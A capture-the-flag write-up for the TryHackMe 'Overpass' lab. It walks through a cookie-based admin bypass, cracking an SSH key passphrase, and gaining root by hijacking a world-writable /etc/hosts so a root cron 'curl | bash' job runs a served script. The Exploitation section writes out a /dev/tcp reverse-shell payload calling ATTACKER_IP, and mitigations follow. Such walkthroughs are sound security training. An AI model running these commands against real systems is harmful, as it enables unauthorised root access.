# THM — Overpass

```
  ██████╗ ██╗   ██╗███████╗██████╗ ██████╗  █████╗ ███████╗███████╗
 ██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝
 ██║   ██║██║   ██║█████╗  ██████╔╝██████╔╝███████║███████╗███████╗
 ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██╔═══╝ ██╔══██║╚════██║╚════██║
 ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║██║     ██║  ██║███████║███████║
  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                     TryHackMe — Easy
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 80 (HTTP, Golang net/http server)
- [x] Browsed the site — a "military-grade" password manager, which is already funny
- [x] `gobuster` enumeration → `/admin`, `/aboutus`, `/downloads`, `/img`, `/css`
- [x] Opened `/admin` login — inspected `login.js` in DevTools
- [x] Spotted broken client-side auth: cookie presence is the only gate
- [x] Set `SessionToken` cookie to an arbitrary value → `/admin` renders
- [x] Pulled passphrase-protected RSA private key for user `james`
- [x] `ssh2john id_rsa > james_hash` → `john` with rockyou.txt → passphrase `james13`
- [x] `ssh -i id_rsa james@...` → shell as `james`
- [x] `cat user.txt` → user flag
- [x] `cat /etc/crontab` → root job: `curl overpass.thm/downloads/src/buildscript.sh | bash`
- [x] `ls -la /etc/hosts` → world-writable (`-rw-rw-rw-`)
- [x] Stood up Python HTTP server with malicious `downloads/src/buildscript.sh`
- [x] Pointed `overpass.thm` at attack box via `/etc/hosts`
- [x] Cron fired within 60s → reverse shell as root
- [x] `cat /root/root.txt` → root flag

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port discovery and service fingerprinting |
| gobuster | Web content/directory brute-force |
| Browser DevTools | Reading `login.js`, setting the `SessionToken` cookie |
| ssh2john | Convert the passphrase-protected RSA key to a john hash |
| John the Ripper | Crack the key passphrase against rockyou.txt |
| ssh | Authenticate to the box as `james` |
| python3 http.server | Serve the malicious `buildscript.sh` over HTTP |
| netcat | Catch the root reverse shell |

---

## TL;DR

Overpass serves a Go-based web app on port 80 advertising itself as a password manager. `gobuster` turns up `/admin`, whose login is "protected" entirely in the browser — `login.js` stores whatever the API returns as a `SessionToken` cookie, and the admin page only checks that the cookie *exists*, not that it's valid. Set the cookie to anything and the admin panel coughs up a passphrase-protected RSA private key for `james`. `ssh2john` + `john` crack the passphrase (`james13`), and that key logs you in over SSH. On the box, `/etc/crontab` has root running `curl overpass.thm/downloads/src/buildscript.sh | bash` every minute — and `/etc/hosts` is world-writable. Point `overpass.thm` at your machine, serve a reverse-shell `buildscript.sh`, wait one minute, and root connects back to you.

---

## Introduction

Overpass is a THM Easy box that teaches two lessons worth more than the difficulty rating suggests. The foothold is **broken authentication** (OWASP A07:2021) in its purest, most instructive form: there is no server-side session validation at all, just JavaScript that trusts a cookie. No CVE, no exploit code — just reading the source the browser happily hands you.

The privilege escalation is a textbook **remote-code-execution-by-cron** combined with a filesystem misconfiguration. A root cron job fetches a script from a hostname and pipes it straight to `bash`. On its own that's risky; with a world-writable `/etc/hosts` to hijack the hostname, it's a one-minute path to root. It's the kind of `curl | bash` pattern people still paste into production runbooks, which is exactly why it's worth internalizing.

---

## Recon

### Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.x.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:30:b5:f2:d4:d1:25:e7:6b:09:d2:04 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports. The HTTP server is a Go binary — the site is a self-hosted "military-grade, open-source password manager." Keep the Go detail in mind; it hints the login API is a custom handler, not a stock framework with known CVEs.

### Web Enumeration

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

```
/aboutus              (Status: 301) [--> /aboutus/]
/admin                (Status: 301) [--> /admin/]
/css                  (Status: 301) [--> /css/]
/downloads            (Status: 301) [--> /downloads/]
/img                  (Status: 301) [--> /img/]
/index.html           (Status: 200) [Size: 2431]
```

`/downloads` hosts the app's own source and binaries (red herring for now). `/admin` is the real target — it's a login form.

---

## Foothold

### Reading the Login Logic

Before touching the form, open DevTools → Sources and read `/login.js`:

```javascript
async function login() {
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=''
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The server returns either the literal string `"Incorrect credentials"` or a token. The client treats *anything else* as a valid token and stores it as `SessionToken`. Crucially, `/admin` itself only checks whether the cookie is present — not whether its value means anything. There is no server-side session table being consulted.

### Setting the Cookie

No valid credentials required. In the DevTools console:

```javascript
document.cookie = "SessionToken=whatever"
```

Reload `/admin`. The panel renders a note addressed to James, and beneath it, his RSA private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
...
-----END RSA PRIVATE KEY-----
```

`Proc-Type: 4,ENCRYPTED` means it's passphrase-protected — the key alone won't log us in.

---

## Shell / Initial Access

### Save and Crack

```bash
# paste the key into id_rsa
chmod 600 id_rsa
ssh2john id_rsa > james_hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt james_hash
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
james13          (id_rsa)
1g 0:00:00:04 DONE (2026-10-23 11:42) 0.2267g/s 2654Kp/s
```

Passphrase: **james13**. (Small detail worth noting: `james` + `13` is almost certainly a human password-reuse tell — it's also his SSH passphrase. Keep it in your pocket in case it unlocks something else.)

### Log In

```bash
ssh -i id_rsa james@10.10.x.x
# Enter passphrase for key 'id_rsa': james13
```

```
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

The SSH session is a proper TTY already — no `script`/PTY gymnastics needed this time.

### User Flag

```bash
cat ~/user.txt
```

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

---

## Escalation Path

### Crontab

Straight to the reliable wins. Service processes and cron first:

```bash
cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Every minute, **root** fetches a script from the hostname `overpass.thm` and pipes it to `bash`. No signature check, no fixed IP — just whatever DNS/`/etc/hosts` resolves that name to.

### Who Controls `overpass.thm`?

The hostname only matters if we can control where it points.

```bash
ls -la /etc/hosts
```

```
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

`-rw-rw-rw-` — world-writable. `james` can rewrite the resolution for `overpass.thm` and the root cron will happily fetch our script instead. That's the whole chain.

---

## Exploitation

### Step 1 — Build the Payload Tree

The cron fetches `overpass.thm/downloads/src/buildscript.sh`, so mirror that path on the attack box:

```bash
mkdir -p ~/overpass/downloads/src
cd ~/overpass
```

```bash
cat > downloads/src/buildscript.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
```

### Step 2 — Listener + Web Server

```bash
nc -lvnp 4444
```

Serve port 80 from the directory that contains `downloads/` (root `curl` uses the default port):

```bash
sudo python3 -m http.server 80
```

### Step 3 — Hijack the Hostname on the Target

Back in the `james` SSH session:

```bash
echo "ATTACKER_IP overpass.thm" >> /etc/hosts
```

```bash
grep overpass /etc/hosts
```

```
ATTACKER_IP overpass.thm
```

### Step 4 — Wait One Minute

The Python server logs the pickup:

```
10.10.x.x - - [GET /downloads/src/buildscript.sh HTTP/1.1] 200 -
```

The listener catches root:

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.x.x] 49876
root@overpass-prod:/#
```

### Root Flag

```bash
cat /root/root.txt
```

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## Rabbit Holes

**Fuzzing the login form for SQLi.** First instinct on seeing `/api/login` was to throw `' OR 1=1--` and SQLi payloads at it. It's a Go `net/http` handler with no SQL behind the login decision — wasted a few minutes before doing the obvious thing and reading `login.js`. **Read the client source before attacking the server.** The vuln was sitting in plaintext in the browser the whole time.

**The `/downloads` source-code dive.** `/downloads` serves the full Go source for the "Overpass" password manager. Spent a while reversing it looking for hardcoded secrets or a crypto flaw in how it stores passwords. There's a cute weak-encryption angle in there, but it's a dead end for *this* path to root — the cron job is the intended route and far shorter.

**Hunting SUID binaries.** Ran `find / -perm -4000 2>/dev/null` out of habit after landing as `james`. Nothing unusual — stock `sudo`, `passwd`, `mount`, etc. Cost nothing but attention, and the cron was the real answer.

**Forgetting `sudo` on the port-80 server.** `python3 -m http.server 80` as a normal user → `PermissionError: [Errno 13]`. Port 80 is privileged. Either `sudo` it or run on a high port and change the cron… except you can't change the cron, so `sudo` it is. One-line fix, thirty-second facepalm.

**Serving from the wrong directory.** On the first try the server was started one level too deep, so the cron's `GET /downloads/src/buildscript.sh` returned 404 (visible right in the server log). The payload has to be reachable at exactly that path — start the server from the parent of `downloads/`.

---

## Flag

| Flag | Value |
|---|---|
| User flag | `thm{65c1aaf000506e56996822c6281e6bf7}` |
| Root flag | `thm{7f336f8c359dbac18d54fdd64ea753bb}` |

---

## Mitigations

**Broken Authentication (OWASP A07:2021) — enforce sessions server-side.** The entire login gate lived in `login.js`: the server returned a token without validating state, and `/admin` only checked that a cookie existed. Fix: validate every request to a protected route against a server-side session store, issue cryptographically random session identifiers, and never let the client decide what "authenticated" means. Cookie presence is not authentication.

**Private key exposed through the web UI — never serve secrets.** `james`'s RSA key was retrievable from the admin panel. Even passphrase-protected, distributing private keys over HTTP is indefensible, and `james13` fell to rockyou.txt in seconds. Fix: keep private keys out of any web-reachable location, enforce strong passphrases, and distribute credentials through a secrets manager with audit logging rather than a webpage.

**World-writable `/etc/hosts` — correct the permissions.** The file was `0666`, letting any local user rewrite name resolution. It should be `0644` (root rw, others r). Fix: `chmod 644 /etc/hosts`, and audit the rest of `/etc` with `find /etc -writable -not -user root 2>/dev/null` to catch similar mistakes.

**Root cron piping remote code to bash — stop `curl | bash` as root.** The root cron fetched a script by hostname and executed it unverified, so whoever controlled resolution of `overpass.thm` controlled root. Fix: don't pipe network content into a privileged shell. If a script must be pulled, pin it to a fixed IP over TLS, verify a checksum or GPG signature before running, and execute it under a least-privileged service account — not root. Removing any one of these (hostname control, the `| bash`, or the root context) breaks the chain.

---

## Key Takeaway

Broken authentication doesn't need to be subtle to be devastating — here it was "the server trusts a cookie it never issued." Anything the browser can read and modify (JavaScript, cookies, local storage) is attacker-controlled. The habit that pays off: read the client-side source *before* attacking the server, because the logic flaw is often sitting there in plaintext.

On the privesc side, `curl | bash` as root is a standing invitation. The moment a privileged process executes content it fetched over the network, your attack surface expands to wherever you can influence that fetch — DNS, `/etc/hosts`, a MITM, a compromised mirror. When enumerating for privesc, check cron jobs and world-writable files in `/etc` early; this box rewards that order directly.

---

## If I Did It Again

I'd open DevTools on `/admin` before even opening a terminal — the whole foothold is in `login.js`, and the SQLi detour was pure wasted motion.

After landing as `james`, my first three commands would be `cat /etc/crontab`, `ls -la /etc/hosts`, and `find /etc -writable -not -user root` — not linpeas. The intended path is short and those three lines reveal it in under ten seconds.

And I'd start the Python server with `sudo` from the correct directory the *first* time, instead of debugging a 404 and a permission error that the server log told me about immediately. Both mistakes were self-inflicted and both were visible in plain sight.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-10-23 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
